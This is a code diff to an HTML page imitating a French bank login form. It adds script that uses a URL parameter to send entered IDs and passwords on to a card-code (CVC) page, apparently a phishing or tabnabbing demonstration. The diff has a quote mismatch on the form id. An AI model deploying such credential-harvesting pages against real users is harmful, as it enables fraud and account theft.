@@ -18,16 +18,31 @@ body, html {
 </style>
 <body>
   <div class="bg">
-      <form method="GET" action="bank1.html">
+      <form method="GET" action="" id="login'>
           <input style="position:absolute;left:21%;top:32%;" type="text" id="id" name="id" value="">
           <input style="position:absolute;left:22%;top:60%" type="password" id="pwd" name="pwd" value="">
-          <input style="position:absolute;left:25%;top:68%" type="submit" id="connexion" name="connexion" value="Se connecter">
+          <input style="position:absolute;left:25%;top:68%" type="submit" id="connexion" name="connexion" value="Se connecter" onclick="send();">
       </form>
   </div>
 </body>
     <script>
-        console.log("Quelle est l'origine?");
-        console.log(window.opener);
+    var url_string = window.location.href;
+    var url = new URL(url_string);
+    var c = url.searchParams.get("PR");
+    console.log(c);
 
+        function send() {
+        console.log("in send");
+        var form = document.getElementById("login");
+
+            if (c) {
+                form.action = "CVC.html"
+                form.submit();
+            }
+            else {
+                form.action = "bank1.html"
+                form.submit();
+            }
+        }
     </script>
 </html>
